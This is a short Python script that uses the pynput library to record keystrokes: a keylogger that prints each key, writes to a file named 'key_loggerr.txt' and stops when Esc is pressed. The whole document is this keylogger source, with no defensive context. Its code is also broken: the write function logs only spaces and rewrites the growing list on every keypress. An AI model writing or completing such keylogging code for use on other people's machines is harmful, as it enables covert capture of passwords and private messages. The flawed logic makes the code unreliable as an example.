from pynput.keyboard import Key, Listener

k=[]

def on_presss(key):
    k.append(key)
    write1(k)
    print(key)

def write1(var):
    with open("key_loggerr.txt","a") as f:
        for i in var:
            new_var=str(i).replace("'",'')
            f.write(" ")

def on_releasee(key):
    if key==Key.esc:
        return False
    


with Listener(on_press=on_presss,on_release=on_releasee) as l:
    l.join()